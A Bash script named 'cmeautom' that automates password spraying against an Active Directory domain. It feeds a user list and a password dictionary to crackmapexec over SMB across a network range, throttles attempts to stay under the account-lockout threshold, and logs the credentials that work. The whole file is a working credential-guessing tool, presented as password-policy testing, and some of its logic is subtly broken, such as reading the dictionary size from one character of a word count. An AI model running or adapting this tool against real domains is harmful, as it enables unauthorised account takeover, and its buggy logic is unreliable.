#! /bin/bash

#################### FUNCIONES
function usage {
	echo -e "cmeautom is a tool that allows test password policy of internal active directory. Usually, ADs have rules that block user account after a number of bad attemps of login. cmeautom controls the time of attempts and the number of attempts in order to perform the test without blocking the users account."
	echo -e "Funciones: . Attempt control\n. No repetition of users already found\n. Manual configuration of password complexity.\n. Make backups of input-files.\n\n"
	echo "Usage:"
	echo -e "./cmeautom.sh [Users account file] [Password dictionary] [Attemps] [Block time] [Network] [Mask] [Domain]\n\n***************************************************\n"
	echo -e "Parameters\n"
	echo -e "Users account file:	 Active Directory users. Format: Only the user account, without the domain (e.g domain\user is not correct. user is correct). One user by line\n"
	echo -e "Password dictionary:	 Password file. Format: One user by line\n"
	echo -e "Attemps:	Attemtps to block the account. If the account will be block after five (5) wrong attemps (This means, the 6th attemps wont be possible because the account was blocked) in ten (10) minutes, we enter five (5).\n"
	echo -e "Block time:		Window time to block the user account. This means, if the account will be block after x wrong attemps in 10 minutes, we entered ten (10).\n"
	echo -e "Network:	 e.g: 192.168.0.0\n"
	echo -e "Mask:	e.g: 24\n"
	echo -e "Domain: 	Client domain. Ej: ENTERPRISE.LOCAL\n"
	echo -e "\n********************************\nInvoke example\n"
	echo -e "./cmeautom.sh clientUserFile passwordsDictionary 5 10 192.168.0.0 24 TEST.LOCAL\n"
	}

function tratamientoPassword(){
	read -p "Minimum number of characters: " carac1
	read -p "Maximum number of characters: " carac2
	read -p "Requires a number?? Y/N: " numeros
	read -p "Requires a capital letter? Y/N: " mayus
	read -p "Requires a symbol?: Y/N: " simb

	grep -E "^.{$carac1,$carac2}$" $1 >> pass.tmp
	rm $1
	mv pass.tmp $1

	if [[ $mayus == "Y" || $mayus == "y" ]]; then
		sed -ni '/[A-Z]/p' $1
	fi
	if [[ $numeros == 'Y' || $numeros == "y" ]]; then
		sed -ni '/[0-9]/p' $1
	fi
	if [[ $simb == 'Y' || $simb == 'y' ]]; then
		sed -ni '/[!@#$&()\\-`.+,/\]/p' $1
	fi	
	clear
}

center() {
  termwidth="$(tput cols)"
  padding="$(printf '%0.1s' ={1..500})"
  printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}

function control_c(){
	if [[ -f ultimos.tmp ]]; then
		rm ultimos.tmp
	fi
	if [[ "$band" == 1 ]]; then
		if [[ -f "$archUs.tmp" ]];then
			rm "$archUs"
			cp "$archUs.tmp" "$archUs"
			rm "$archUs.tmp"
		fi
		
		rm $archPw
		cp "$archPw.tmp" "$archPw"
		rm "$archPw.tmp"
	fi
	echo -e "$lines" >> ultimos.tmp #Usuario
	echo -e "$line" >> ultimos.tmp #Password
	kill $PID
	exit
}

#################### FUNCIONES

#################### VALIDACIONES
if [[ $1 == "-help" || $1 == "--help" || $1 == "-h" ]]; then
usage
exit
fi

if [ $# != 7 ]; then
echo "Incorrect number of parameters. Retry."
exit
else
echo "Good!"
fi
center " Password crack "

cp $1 $1.bak
cp $2 $2.bak
read -p "Do you want to enter password complexity values? S/N: " valor
if [[ $valor == "S" || $valor == "s" || $valor == 'S' || $valor == 's' ]]; then
tratamientoPassword $2
else clear
fi

if [[ $3 -lt "1" ]]; then
echo -e "\e[1;31mInvalid number of attempts. It must be at least 1\e[0m"
exit
fi

if [[ $4 == "0" ]]; then
echo -e "\e[1;31mTime equal to zero. It's not allowed\e[0m"
exit
fi


val=1
if [[ $3 == "1" ]]; then
echo -e "\e[1;31mNumber of attempts less than or equal to 1\e[0m"
val=0
fi
#################### VALIDACIONES

#################### MAIN

archUs=$1
archPw=$2
band=0
if [[ -f ultimos.tmp ]]; then
	var=1	
	while read -r ult;
	do
		if [ "$var" == 1 ];then
		ultUser=$(echo $ult)
		var=0
		else
		ultPw=$(echo $ult)
		fi
	done < ultimos.tmp

	echo "Last user: $ultUser"
	echo "Last password: $ultPw"
	read -p "Do you want to continue from the last point? [User: $ultUser][Password: $ultPw] [Y/N]" rta
	if [[ "$rta" == "Y" || "$rta" == "y" ]]; then
		cp "$1" "$1.tmp"
		cp "$2" "$2.tmp"
		band=1
		awk "/^$ultPw$/,/*/" $2 > tmp && mv tmp $2		
		awk "/^$ultUser$/,/*/" $1 > tmp && mv tmp $1
		clear
	fi
	
fi

trap control_c SIGINT 

inte=`expr $3 - 1`
tiempo=`expr $4 \* 60`
dominio=$(echo "$7")
i=1
k=0
tamano=$(wc -w $2)
tam="${tamano:0:1}"


center " $inte attemps will be made every $4 minutes($tiempo seconds). Target: $dominio"
while [[ "$i" -lt "$3" && "$k" -lt "$tam" ]];
do
		read -r line
		echo -e "\e[1;32m [+] Actual password: *$line*. Numero: $k\e[0m";
		echo -e "\e[0;32m [++] Actual attempt: $i\e[0m"
			while read -r lines; do
				echo -e "\t \e[1;33m [+++] Actual user: *$lines*\e[0m"
					resultado=$(crackmapexec smb ${5}/${6} -u $lines -p $line -d $dominio --shares)
					echo -e "$resultado \n" >> logCME
					echo "$resultado"| while read linea; do
						if [[ $linea == *"Enumerating shares"* ]]
						then
							sed -i "s/\<$lines\>//g" $1 ## Aca deberiamos eliminar la palabra del archivo.	
							sed -i '/^ *$/d' $1
							final=$(echo $linea | sed 's/^[^0-9]*\(.*\)/\1/')
				   			echo -e "****************************\nLogin attempt successfully! User: $lines. Password: $line.\nDatos: $final\n****************************" >> finallogscript
							echo -e "\t\t \e[1;37m ****Login attempt successfully. User: $lines****\e[0m"
						fi
					done
			done < "$1"
		if [[ $band == 1 ]];then
			rm "$1"
			cp "$1.tmp" "$1"
			rm "$1.tmp"
			band=0
		fi
		let i=i+1
		let k=k+1
	if [[ "$i" == "$3" ]]
	then
		i=1
		echo -e "\e[1;36m Sleeping for $4 minutes ($tiempo seconds) \e[0\m"
		sleep $tiempo #X tiempo va a permanecer esperando el script
	fi
done < "$2"

center " END "
if [[ -f ultimos.tmp ]]; then
		rm ultimos.tmp
	fi
	if [[ "$band" == 1 ]]; then
		if [[ -f "$archUs.tmp" ]];then
			rm "$archUs"
			cp "$archUs.tmp" "$archUs"
			rm "$archUs.tmp"
		fi
		
		rm $archPw
		cp "$archPw.tmp" "$archPw"
		rm "$archPw.tmp"
	fi
#################### MAIN

